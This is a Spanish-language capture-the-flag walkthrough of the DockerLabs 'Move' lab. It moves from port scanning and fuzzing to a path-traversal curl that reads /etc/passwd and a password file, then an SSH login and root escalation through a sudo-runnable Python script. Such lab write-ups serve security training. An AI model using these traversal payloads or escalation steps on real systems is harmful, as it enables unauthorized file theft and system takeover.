### Move-DockerLabs🇪🇸

#### 1. Primero vamos a desempaquetar el archivo y encender el laboratorio.
```bash
 unzip move.zip
```

<img width="966" height="277" alt="image" src="https://github.com/user-attachments/assets/ec5f5ccc-821c-400e-8d1d-56bfa5c45d9b" />


```bash
sudo bash ./auto_deploy.sh move.tar 
```

<img width="964" height="217" alt="image" src="https://github.com/user-attachments/assets/74c68e6c-3813-4b7c-aa7f-9148bddf347d" />


#### 2. Ahora vamos a comprobar la conexión con el laboratorio mediante un ping.
```bash
 ping -c3 172.17.0.2
```

<img width="967" height="164" alt="image" src="https://github.com/user-attachments/assets/20d1dc9a-6afc-41d1-8205-a985f63518cc" />


#### 3. Ahora vamos a escanear los puertos que estan abiertos con nmap.
```bash
 nmap -sCV 172.17.0.2
```

<img width="958" height="791" alt="image" src="https://github.com/user-attachments/assets/3416969d-c12e-4f96-b5ab-196795747f2a" />


#### 4. Entraremos al http por el puerto 3000.

<img width="947" height="815" alt="image" src="https://github.com/user-attachments/assets/2f209a2c-4f41-4cac-934e-f111b220d6f4" />


#### 5. Vamos a buscar las webes ocultas con ffuz.
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ -e .html,.php,.txt,.xml,.js
```

<img width="955" height="828" alt="image" src="https://github.com/user-attachments/assets/e4c7a94d-212c-4a90-a7f4-350330e12089" />

#### 5.B Entraremos en maintenace para ver que hay.

<img width="970" height="473" alt="image" src="https://github.com/user-attachments/assets/9e2eda72-daab-445e-a50d-9e830f754a56" />


#### 6. ENtraremos en la web y probaremos las tipicas combinaciones de ingeneria social y logramos ver que son admin, ahora pondremos una contraseña que recordemos


<img width="959" height="976" alt="image" src="https://github.com/user-attachments/assets/6d6bd47f-511e-4a84-a02f-3cc9b6162f25" />


#### 7. Ahora mirando en la web descubrimos que hay una sección de alertas, la cual es probable que muestre contenido de usuarios.

<img width="958" height="666" alt="image" src="https://github.com/user-attachments/assets/d1b6343c-8b42-48dc-be41-fa7ae04526ba" />

#### 8. Haremos un curl para mostrar los datos de etc/passwd de esta web.
```bash
 curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```

<img width="961" height="546" alt="image" src="https://github.com/user-attachments/assets/2425bf2a-5e5f-4657-a3cf-07bdbe3b5875" />


#### 9. Vamos a leer ahora la web que antes apareia maintenance.
```bash
 curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../tmp/pass.txt
```

<img width="958" height="115" alt="image" src="https://github.com/user-attachments/assets/2caf4eab-798e-40cb-8546-964be1b88a85" />


#### 10. Entraremos mediando ssh con el usuario freddy y la contraseña encontrada anteriormente.
```bash
ssh freddy@172.17.0.2
```

<img width="966" height="620" alt="image" src="https://github.com/user-attachments/assets/d002a506-ac1e-4d9c-98b1-ef60635951f4" />


#### 11. Haciendo `sudo -l` podremos ver los binarios que se pueden modificar.

<img width="957" height="175" alt="image" src="https://github.com/user-attachments/assets/e7655e96-e4da-4f9f-9779-2a33563ae162" />


#### 12. Iremos a modificar el python con nano con:
```bash
import os
os.system("/bin/bash")
```

###13. Ahora lo ejecutaremos ya que tenemos esos privilegios y escalaremos privilegios.
```bash
 sudo /usr/bin/python3 /opt/maintenance.py
```

<img width="963" height="341" alt="image" src="https://github.com/user-attachments/assets/29af361e-574f-4a6d-9a16-d5b5432f7230" />











